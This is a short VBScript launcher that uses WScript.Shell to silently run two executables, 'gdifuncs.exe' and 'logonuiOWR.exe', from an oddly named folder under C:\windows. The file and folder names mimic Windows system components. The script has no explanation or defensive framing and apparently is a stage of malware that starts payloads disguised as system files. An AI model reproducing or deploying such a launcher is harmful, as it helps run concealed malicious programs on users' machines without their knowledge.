Option Explicit
Dim objWshShell
Set objWshShell = WScript.CreateObject("WScript.Shell")
objWshShell.Run "C:\windows\winbase_base_procid_none\secureloc0x65\gdifuncs.exe"
objWshShell.Run "C:\windows\winbase_base_procid_none\secureloc0x65\logonuiOWR.exe"
